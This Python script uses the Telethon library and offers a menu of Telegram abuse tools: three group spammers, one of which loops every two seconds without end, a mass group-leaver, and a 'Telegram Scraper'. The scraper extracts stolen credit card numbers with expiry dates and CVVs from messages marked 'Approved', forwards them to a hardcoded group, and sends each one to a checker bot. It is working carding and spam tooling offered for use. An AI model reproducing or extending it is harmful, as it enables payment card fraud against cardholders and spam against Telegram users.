from telethon import TelegramClient
from telethon.errors import rpcerrorlist, FloodWaitError, ChatWriteForbiddenError
import asyncio
import os
from colorama import Fore, Style
from telethon.tl.functions.channels import LeaveChannelRequest
from telethon.tl import functions, types
import re
import progressbar

try:
    import progressbar
except ModuleNotFoundError:
    print("Please run > pip install progressbar2")

# Check if API credentials are already stored in a file
if os.path.isfile("spamer.txt"):
    with open("spamer.txt", "r") as r:
        data = r.readlines()
    api_id = int(data[0])
    api_hash = data[1].strip()  # Remove leading/trailing whitespaces
else:
    api_id = input("Enter api_id: ")
    api_hash = input("Enter api_hash: ")
    with open("spamer.txt", "w") as a:
        a.write(str(api_id) + "\n" + api_hash)

client = TelegramClient("spamer", api_id, api_hash)


async def check_responses(client):
    async for message in client.iter_messages("me"):
        print(f"Received Message:\n{message.text}")


async def send_message_to_group(client, target, message):
    try:
        await client.send_message(target.id, message)
        await check_responses(client)

    except rpcerrorlist.ChatAdminRequiredError:
        print(
            f"{Fore.RED}[!] You do not have permission to post messages in this chat!{Style.RESET_ALL}"
        )
    except ChatWriteForbiddenError:
        print(
            f"{Fore.RED}[!] You have been restricted from writing messages in this chat...!{Style.RESET_ALL}"
        )
    except FloodWaitError as e:
        print(f"{Fore.RED}[!] Try again after {e.seconds} seconds{Style.RESET_ALL}")
    except rpcerrorlist.InputUserDeactivatedError:
        print(
            f"{Fore.RED}[!] The specified user was deleted or deactivated.{Style.RESET_ALL}"
        )
    except Exception as e:
        print(f"{Fore.RED}[!] An error occurred: {e}{Style.RESET_ALL}")


async def normal_spammer():
    dialogs = await client.get_dialogs()
    print(f"{Fore.CYAN}Available Groups:{Style.RESET_ALL}")
    for i, dialog in enumerate(dialogs):
        print(
            f"{Fore.YELLOW}{i + 1} : {dialog.name} has ID {dialog.id}{Style.RESET_ALL}"
        )

    try:
        group_number = int(
            input(
                f"{Fore.MAGENTA}Please insert group number to spam: {Style.RESET_ALL}"
            )
        )
        if 1 <= group_number <= len(dialogs):
            selected_group = dialogs[group_number - 1]
            print(
                f"{Fore.GREEN}Selected Group: {selected_group.name} (ID: {selected_group.id}){Style.RESET_ALL}"
            )

            message_choice = input(
                f"{Fore.MAGENTA}Enter '1' to input spam message, '2' to provide path to text file: {Style.RESET_ALL}"
            )

            if message_choice == "1":
                message = input(
                    f"{Fore.MAGENTA}Enter the spam message: {Style.RESET_ALL}"
                )
            elif message_choice == "2":
                file_path = input(
                    f"{Fore.MAGENTA}Enter the path to the text file containing spam message: {Style.RESET_ALL}"
                ).strip('"')
                with open(file_path, "r") as file:
                    message = file.read()
            else:
                print(
                    f"{Fore.RED}Invalid choice. Please choose '1' or '2'.{Style.RESET_ALL}"
                )
                return

            while True:
                sent_message = await send_message_to_group(
                    client, selected_group, message.strip()
                )
                print(f"{Fore.YELLOW}Next spam round in 2 seconds{Style.RESET_ALL}")
                await asyncio.sleep(2)
        else:
            print(
                f"{Fore.RED}Invalid group number. Please choose a number between 1 and {len(dialogs)}{Style.RESET_ALL}"
            )
    except ValueError:
        print(f"{Fore.RED}Invalid input. Please enter a number.{Style.RESET_ALL}")


async def medium_spammer():
    dialogs = await client.get_dialogs()
    print(f"{Fore.CYAN}Available Groups:{Style.RESET_ALL}")
    for i, dialog in enumerate(dialogs):
        print(
            f"{Fore.YELLOW}{i + 1} : {dialog.name} has ID {dialog.id}{Style.RESET_ALL}"
        )

    try:
        selected_groups = []
        while True:
            group_number = input(
                f"{Fore.MAGENTA}Enter group number to add to spam list (or 'done' to finish): {Style.RESET_ALL}"
            )
            if group_number.lower() == "done":
                break
            try:
                group_number = int(group_number)
                if 1 <= group_number <= len(dialogs):
                    selected_groups.append(dialogs[group_number - 1])
                    print(
                        f"{Fore.GREEN}Group added: {dialogs[group_number - 1].name} (ID: {dialogs[group_number - 1].id}){Style.RESET_ALL}"
                    )
                else:
                    print(
                        f"{Fore.RED}Invalid group number. Please choose a number between 1 and {len(dialogs)}{Style.RESET_ALL}"
                    )
            except ValueError:
                print(
                    f"{Fore.RED}Invalid input. Please enter a number or 'done'.{Style.RESET_ALL}"
                )

        if not selected_groups:
            print(f"{Fore.RED}No groups selected. Exiting.{Style.RESET_ALL}")
            return

        interval = int(
            input(
                f"{Fore.MAGENTA}Enter the interval between messages (in seconds, more than 180 seconds): {Style.RESET_ALL}"
            )
        )
        if interval < 180:
            print(
                f"{Fore.RED}Interval should be greater than 180 seconds (3 minutes). Exiting.{Style.RESET_ALL}"
            )
            return

        message_choice = input(
            f"{Fore.MAGENTA}Enter '1' to input spam message, '2' to provide path to text file: {Style.RESET_ALL}"
        )

        if message_choice == "1":
            message = input(f"{Fore.MAGENTA}Enter the spam message: {Style.RESET_ALL}")
        elif message_choice == "2":
            file_path = input(
                f"{Fore.MAGENTA}Enter the path to the text file containing spam message: {Style.RESET_ALL}"
            ).strip('"')
            with open(file_path, "r") as file:
                message = file.read()
        else:
            print(
                f"{Fore.RED}Invalid choice. Please choose '1' or '2'. Exiting.{Style.RESET_ALL}"
            )
            return

        while True:
            for selected_group in selected_groups:
                await send_message_to_group(client, selected_group, message.strip())
                print(
                    f"{Fore.YELLOW}Message sent to group: {selected_group.name} (ID: {selected_group.id}){Style.RESET_ALL}"
                )
            print(
                f"{Fore.YELLOW}Next spam round in {interval} seconds{Style.RESET_ALL}"
            )
            await asyncio.sleep(interval)

    except ValueError:
        print(
            f"{Fore.RED}Invalid input. Please enter a valid number or 'done'.{Style.RESET_ALL}"
        )


async def advanced_spammer(client):
    dialogs = await client.get_dialogs()
    print(f"{Fore.CYAN}Available Groups:{Style.RESET_ALL}")
    for i, dialog in enumerate(dialogs):
        print(
            f"{Fore.YELLOW}{i + 1} : {dialog.name} has ID {dialog.id}{Style.RESET_ALL}"
        )

    try:
        group_number = int(
            input(
                f"{Fore.MAGENTA}Please insert group number to spam: {Style.RESET_ALL}"
            )
        )
        if 1 <= group_number <= len(dialogs):
            selected_group = dialogs[group_number - 1]
            print(
                f"{Fore.GREEN}Selected Group: {selected_group.name} (ID: {selected_group.id}){Style.RESET_ALL}"
            )
            interval = int(
                input(
                    f"{Fore.MAGENTA}Enter the interval between messages (in seconds): {Style.RESET_ALL}"
                )
            )
            messages_file = input(
                f"{Fore.MAGENTA}Enter the path to the file containing spam messages: {Style.RESET_ALL}"
            ).strip('"')
            with open(messages_file, "r") as file:
                messages = file.readlines()

            while True:
                for message in messages:
                    sent_message = await send_message_to_group(
                        client, selected_group, message.strip()
                    )
                    print(
                        f"{Fore.YELLOW}Next spam round in {interval} seconds{Style.RESET_ALL}"
                    )
                    await asyncio.sleep(interval)
        else:
            print(
                f"{Fore.RED}Invalid group number. Please choose a number between 1 and {len(dialogs)}{Style.RESET_ALL}"
            )
    except ValueError:
        print(f"{Fore.RED}Invalid input. Please enter a number.{Style.RESET_ALL}")
    except KeyboardInterrupt:
        print(f"{Fore.RED}Spamming interrupted. Exiting...{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}An error occurred: {e}{Style.RESET_ALL}")


async def leave_unselected_dialogs(client, selected_dialog_ids):
    try:
        dialogs = await client.get_dialogs()
        for dialog in dialogs:
            if dialog.id not in selected_dialog_ids:
                if hasattr(dialog.entity, "channel_id"):
                    await client(LeaveChannelRequest(dialog.id))
                    print(f"Left channel: {dialog.name} (ID: {dialog.id})")
                else:
                    await client.delete_dialog(dialog.id)
                    print(f"Left private chat: {dialog.name} (ID: {dialog.id})")
        print("Left unselected dialogs successfully.")
    except Exception as e:
        print(f"An error occurred: {e}")


async def select_dialogs(client):
    dialogs = await client.get_dialogs()

    print(f"{Fore.CYAN}Available Dialogs:{Style.RESET_ALL}")
    for i, dialog in enumerate(dialogs, start=1):
        print(f"{Fore.YELLOW}{i}: {dialog.name} (ID: {dialog.id}){Style.RESET_ALL}")

    selected_dialog_ids = []
    while True:
        dialog_numbers = input(
            f"{Fore.MAGENTA}Enter dialog numbers to save (separated by commas) or 'done' to finish: {Style.RESET_ALL}"
        )
        if dialog_numbers.lower() == "done":
            break
        try:
            dialog_numbers = [int(num.strip()) for num in dialog_numbers.split(",")]
            selected_dialog_ids.extend(dialogs[num - 1].id for num in dialog_numbers)
        except (ValueError, IndexError):
            print(
                f"{Fore.RED}Invalid input. Please enter valid numbers separated by commas or 'done'.{Style.RESET_ALL}"
            )

    await leave_unselected_dialogs(client, selected_dialog_ids)



forward_to_group = -1002002103998
command_interval = 30
forward_interval = 3


async def telegram_scraper(client, forward_to_group, command_interval, forward_interval):
    try:
        print(f"{Fore.CYAN}Available Groups:{Style.RESET_ALL}")
        dialogs = await client.get_dialogs()
        for i, dialog in enumerate(dialogs):
            print(f"{Fore.YELLOW}{i + 1} : {dialog.name} has ID {dialog.id}{Style.RESET_ALL}")

        group_number = int(input(f"{Fore.MAGENTA}Please insert group number to scrape approved credit cards: {Style.RESET_ALL}"))
        if 1 <= group_number <= len(dialogs):
            selected_group = dialogs[group_number - 1]
            print(f"{Fore.GREEN}Selected Group: {selected_group.name} (ID: {selected_group.id}){Style.RESET_ALL}")

        processed_messages = set()
        max_cards = 40
        total_cards_count = 0

        while total_cards_count < max_cards:
            approved_cards = []
            card_count = 0
            async for message in client.iter_messages(selected_group):
                if message.id in processed_messages:
                    continue

                if message.text and '𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅' in message.text:
                    card_pattern = r'\b\d{16}\|\d{2}\|\d{4}\|\d{3}\b'
                    card_matches = re.findall(card_pattern, message.text)
                    for card_match in card_matches:
                        approved_cards.append(card_match)
                        card_count += 1
                        total_cards_count += 1
                        print(f'Found {total_cards_count} Approved Card ✅')

                        try:
                            # Forward the individual message to the specified group
                            await client.forward_messages(forward_to_group, message)
                            print(f'Forwarded message containing approved card: {message.text}')
                            await asyncio.sleep(forward_interval)  # Wait for the specified interval before forwarding the next card
                        except Exception as e:
                            print(f'Failed to forward message: {e}')

                        try:
                            # Sending the /au command to the selected bot
                            await client.send_message(6238802125, f'/au {card_match}')
                            print(f'Sent command to check card: {card_match}')
                            await asyncio.sleep(command_interval)  # Wait for the specified interval before checking the next card
                        except Exception as e:
                            print(f'Failed to check card {card_match}: {e}')

                processed_messages.add(message.id)

            if not approved_cards:
                print("No more approved cards found in this group.")
                break

        print("All cards forwarded and checked.")

    except Exception as e:
        print(f"An error occurred: {e}")

    finally:
        await client.disconnect()


if __name__ == "__main__":
    with client:
        print(f"{Fore.CYAN}░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░")
        print("░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░")
        print("░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░")
        print("░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░")
        print("░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░")
        print("█░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█")
        print("█░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█")
        print("░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░")
        print("░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░")
        print("░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░")
        print("░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░")
        print("░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░")
        print("░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░")
        print("░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░")
        print("░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░")
        print("           ~Made by @HadesLinux")
        print(f"{Style.RESET_ALL}")

        print(
            f"{Fore.CYAN}1. Normal Spammer\n2. Medium Spammer\n3. Advanced Spammer\n4. Groups Deleter\n5. Telegram Scrapper ✅{Style.RESET_ALL}"
        )
        tool_choice = input(
            f"{Fore.MAGENTA}Choose a tool (1/2/3/4/5): {Style.RESET_ALL}"
        )

        if tool_choice == "1":
            print(
                "Normal Spammer: Spams a single message to a selected group at a 2-second interval."
            )
            client.loop.run_until_complete(normal_spammer())
        elif tool_choice == "2":
            print(
                "Medium Spammer: Spams a message to multiple selected groups at a specified interval."
            )
            client.loop.run_until_complete(medium_spammer())
        elif tool_choice == "3":
            print(
                "Advanced Spammer: Spams multiple messages from a file to a selected group at a specified interval."
            )
            client.loop.run_until_complete(advanced_spammer(client))
        elif tool_choice == "4":
            print("Groups Deleter: Leaves all groups except the selected ones.")
            client.loop.run_until_complete(select_dialogs(client))
        elif tool_choice == "5":
            print(
                "Telegram Scraper: Scrapes approved credit card information and forwards it to a specified group."
            )
            asyncio.get_event_loop().run_until_complete(
                telegram_scraper(
                 client, forward_to_group, command_interval, forward_interval
                )
            )
            print("Done All Scraping Check")

